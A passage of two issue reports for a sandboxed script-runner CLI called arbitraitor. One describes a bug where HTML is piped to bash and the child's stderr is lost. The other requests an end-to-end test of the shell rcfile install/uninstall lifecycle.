execution error: script input I/O failure during write-script-stdin (bash exited 1: "bash: !DOCTYPE: No such file or directory")
```

or, for unshare failures:

```
execution error: script input I/O failure during write-script-stdin (child exited before reading stdin; stderr="unshare: operation not permitted")
```

Concretely:

- Extend `ExecError::ScriptIo` with `child_exit_code: Option<i32>` and `child_stderr: Vec<u8>` (or introduce `ExecError::ChildExitedEarly { stage, exit_code, stdout, stderr, source }`).
- On `write_all` / `flush` error, do not return immediately — call `read_with_limit(&mut child, …)` first (best-effort; ignore its `OutputExceeded`/`Wait` errors, just take what it captured).
- Propagate the captured stderr up so the CLI can include it in the failure message and in the receipt.
- Consider also printing the child's stderr to the user in `write_sanitized_output` / `write_failure` for the `RunFailure::Execution(_)` variant when available.

## Impact

- **Correctness**: HTML, JSON, XML, archives, and unknown content types should never be piped to bash. This is the primary bug.
- **Diagnostics**: any `unshare` / Landlock / pre-exec failure that makes the child exit before reading its stdin currently shows up as the same opaque `write-script-stdin` failure. The fix would let users distinguish "I gave bash junk" from "my kernel won't let me create a user namespace" from "Landlock blocked the interpreter path".
- **Security (low-to-moderate)**: HTML and similar markup/text can incidentally contain bash-parseable redirections, command substitutions, and pipes that the user did not intend to execute. Refusing to execute non-script content types removes this foot-gun. No remote attacker-controllable code path was found beyond the user's own `arbitraitor run` invocation of an attacker-supplied URL.

## Environment

- Reproduced on Linux x86_64 against `origin/main` (HEAD at time of report: `7cb6906`).
- Bash at `/bin/bash`; `unshare` available at `/usr/bin/unshare`.

## Acceptance criteria

- [ ] `arbitraitor run https://qlty.sh` does NOT pipe HTML to bash. It either refuses with a clear `blocked` message citing the non-executable artifact type, or skips execution and still writes a Verdict-only receipt.
- [ ] For artifacts that *are* executable shell scripts but bash exits early on, the user sees the actual bash stderr (parse error, etc.), not just `script input I/O failure during write-script-stdin`.
- [ ] For environments where `unshare --user` is denied, the user gets a message that names unshare/user-namespace as the problem, not a `write-script-stdin` I/O failure.
- [ ] New unit/integration tests cover: (a) `run` refuses `HtmlDocument` artifacts; (b) `execute()` retains child stderr on `write_all` failure; (c) reproduction of the unshare-denied path.
- [ ] CHANGELOG `[Unreleased]` entry added.
- [ ] `book/src/cli-reference.md` updated if the non-executable refusal adds a new exit code or output line.
- [ ] ADR added if the content-type execution gate is a durable architectural decision (likely — analogous to ADR-0007 containment matrix).

title: test(cli): end-to-end wrappers init --install / --uninstall lifecycle
body:
## Context

PR #613 (`docs(wrappers): document shell integration pattern + fix fictional CLI page`) cleaned up the published documentation for the `wrappers` command and `wrappers init` shell-integration flow. The implementation in:

- `crates/arbitraitor-cli/src/main.rs` `wrappers()` (lines 773-852) — install/uninstall/status/init/init-script handlers
- `crates/arbitraitor-cli/src/main.rs` `handle_init()` (lines 854-979+) — init mode, --install/--uninstall/--detect-shell/--dry-run/--no-backup
- `crates/arbitraitor-wrapper/src/init.rs` `install_to_rcfile_in()` (line 513+), `uninstall_from_rcfile_in()` (line 638+), `replace_or_append_block()` — marker-block lifecycle

is exercised by unit tests for parsing (`crates/arbitraitor-cli/src/tests.rs:565-696` parses every flag combination) and at the wrapper library layer (`crates/arbitraitor-wrapper/src/init.rs:892-995` tests `install_to_rcfile_in` directly).

**Gap**: there is no end-to-end test that exercises the CLI driver path through `handle_init` against a fixture rcfile. Specifically, the marker-block lifecycle (install → re-install → uninstall → exit codes → no-op when already-uninstalled) is not verified at the integration boundary.

## Acceptance

- [ ] New integration test file `crates/arbitraitor-cli/tests/cli_wrappers_init.rs` (or extension of existing `cli_smoke.rs`).
- [ ] Sets up a temp `HOME` directory (use `tempfile::TempDir` and set `HOME` env var so `default_shim_dir()` and `target_rcfile()` resolve under the temp path).
- [ ] Spawns the binary as `arbitraitor wrappers init bash --install --shim-dir <temp>` against a fixture `.bashrc`.
- [ ] Verifies:
  - First `--install` writes the marker block + the snippet line.
  - Second `--install` (idempotent) leaves the file unchanged (same line count, same content).
  - `--install --dry-run` does not modify the file.
  - `--uninstall` removes the block.
  - `--uninstall` again (no-op) succeeds and reports "removed init block" OR clearly states it was already absent (current behaviour: errors with "marker block not found" — verify that is the intended behaviour; if not, file as separate issue).
- [ ] Verify exit codes (0 on success; non-zero when shell is unknown or rcfile cannot be written).
- [ ] Verify backup file `<rcfile>.arbitraitor.bak` is created by default and not created with `--no-backup`.
- [ ] Property-test style: install on bash, re-install on zsh, verify both rcfiles contain the right snippet (multiple-shell support).

## Why this is worth a test gap issue

The marker-block lifecycle is a security-relevant UX contract: a user must be able to install, upgrade, and remove shell integration without residue in their rcfile. A regression that silently duplicates the PATH line, or leaves the marker block on uninstall, would degrade trust in the tool.

## Research reference

PR #613 included librarian research (`.omo/ulw-research/20260720-101910/REPORT.md`, session-local) covering industry best practices for shell-env injection in CLI tools. The pattern pnpm's `@pnpm/path-extender` uses (`updateShellConfig` returns `ChangeType::{created,modified,skipped}`) is the closest precedent and explicitly tests the same lifecycle.

🤖 Tracked by PR #613 review.
